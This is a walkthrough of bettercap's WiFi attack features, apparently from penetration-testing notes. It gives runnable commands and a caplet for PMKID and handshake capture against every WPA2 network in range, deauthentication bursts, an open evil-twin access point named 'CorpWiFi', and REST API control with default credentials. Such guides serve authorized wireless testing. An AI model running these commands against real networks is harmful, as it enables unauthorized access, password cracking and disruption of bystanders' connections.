# bettercap — walkthrough

**Verified against:** bettercap 2.32.0

Bettercap's WiFi module is fast for interactive recon and prototype
attacks. It's not a replacement for hcxtools + hostapd on a real
engagement, but it's excellent when you want a REPL and a live
session state.

## Preconditions

- Pineapple or laptop with monitor+injection adapter.
- bettercap installed (`apt install bettercap` on Kali, or from
  release binaries).
- Root privileges.

## Path A — Interactive recon session

```
sudo bettercap -iface wlan1

# In the bettercap REPL:
> set wifi.interface wlan1mon
> set wifi.recon.channels ""              # empty = hop across all
> set wifi.handshakes.file /tmp/hs.pcap    # collect handshakes here
> set wifi.handshakes.aggregate true
> wifi.recon on
> wifi.show                                # snapshot of APs + STAs
> set wifi.recon.channels 6                # lock to channel 6
> wifi.assoc <BSSID>                       # PMKID capture attempt
> !ls -l /tmp/hs.pcap                      # confirm handshakes land
```

Bettercap has no `session.save`/`session.load` verbs. To persist a
recipe, write the `set` / `on` lines above into a `.cap` file and
reload them with `load /root/caplets/current-run.cap` (or launch
bettercap with `-caplet <path>`). See Path B for the caplet form.

## Path B — PMKID capture in a caplet

Bettercap's "caplets" are scripted routines. Write once, run
repeatedly.

```
# /root/caplets/pmkid-hunt.cap
set wifi.interface wlan1mon
set wifi.recon.channels ""                     # hop everywhere
set wifi.handshakes.file /root/pmkid.pcap
set wifi.handshakes.aggregate true
wifi.recon on

# Auto-associate against every WPA2 AP seen — trigger PMKID emit.
set wifi.assoc.silent true
wifi.assoc all

sleep 60
wifi.recon off
```

Run:

```
sudo bettercap -iface wlan1 -caplet /root/caplets/pmkid-hunt.cap
```

Bettercap writes captured PMKIDs to the path set by
`wifi.handshakes.file` (in the caplet above, `/root/pmkid.pcap`) —
feed to `hcxpcapngtool` and hashcat as usual.

## Path C — Rogue AP inline

`wifi.ap` takes no positional args; you configure it via `set` and
then start it bare.

```
> set wifi.ap.ssid CorpWiFi
> set wifi.ap.bssid ff:ff:ff:ff:ff:ff
> set wifi.ap.channel 6
> set wifi.ap.encryption false      # open; true = WEP
> wifi.ap
```

Bettercap brings up a hostapd-style AP with the given SSID / BSSID /
channel / encryption. Handy when you want a quick evil twin without
writing a hostapd.conf.

For richer configs (WPA2-PSK, WPA2-Enterprise), prefer standalone
hostapd — bettercap's inline AP is for quick spikes.

## Path D — Deauth + capture chain

```
> set wifi.interface wlan1mon
> set wifi.handshakes.file /tmp/deauth-cap.pcap
> set wifi.handshakes.aggregate true
> wifi.recon on
> sleep 15
> wifi.deauth <target-BSSID>
> wifi.recon off
> !ls -l /tmp/deauth-cap.pcap        # inspect the capture
> wifi.show                          # STAs / handshakes column
```

The `wifi.deauth` command sends a burst; bettercap uses its own
counter, not aireplay's.

## Path E — Client-probe observation

Bettercap does not inject probe requests; the WiFi module is a
listener for them. `wifi.recon on` prints probe requests as clients
emit them, and each is attached to the STA row in `wifi.show`.

```
> wifi.recon on
> events.stream on                   # tail every event, incl. probes
```

For *injected* probes (karma-family testing) reach for `mdk4 p -f
<ssid-list> <iface>` or `aireplay-ng -9 -e <ssid> <iface>` — not
bettercap.

## Path F — REST API for scripted engagements

```
sudo bettercap -iface wlan1 -eval "api.rest on"

# Now hit the REST endpoint from any language:
curl -sk https://user:pass@localhost:8083/api/session | jq
```

Endpoints: `/api/session`, `/api/events`, `/api/session/wifi/aps`,
`/api/session/wifi/stas`. See bettercap docs for full API surface.

## Failure modes

- **`wifi.recon on` fails with "no monitor iface".** Bettercap's
  built-in `iface set-monitor` doesn't always work; fall back to
  `sudo airmon-ng start wlan1` first, then `-iface wlan1mon`.
- **`wifi.assoc all` doesn't yield PMKIDs.** Some APs suppress
  PMKID. Confirm with `wifi.show` that the target reports
  `WPA2-PSK` and inspect the PMKID column in `wifi.show`.
- **REST API off.** Some Kali builds ship bettercap without the
  API enabled by default; add `-eval "api.rest on; api.rest.
  username user; api.rest.password pass"` to the launch line.
- **State loss on crash.** Bettercap doesn't persist REPL state
  between runs — encode the recipe in a caplet and reload it on
  restart.

## When to reach for bettercap

- **Interactive recon** where you want a REPL and quick pivots.
- **Prototyping caplets** for later production use.
- **Multi-op setups** where the REST API drives a monitor from a
  separate laptop.

## When NOT to

- **Handshake / PMKID production capture** — hcxdumptool is faster
  and has better filtering.
- **WPA2-Enterprise rogue** — bettercap's inline AP doesn't do EAP;
  use hostapd-wpe / eaphammer directly.
- **Long-duration passive collection** — kismet's database is
  better designed for it.

## Cite

- bettercap.org — WiFi module documentation.
- attacks.json: `pmkid-capture`, `wpa2-4way-capture`,
  `evil-twin-clone`.
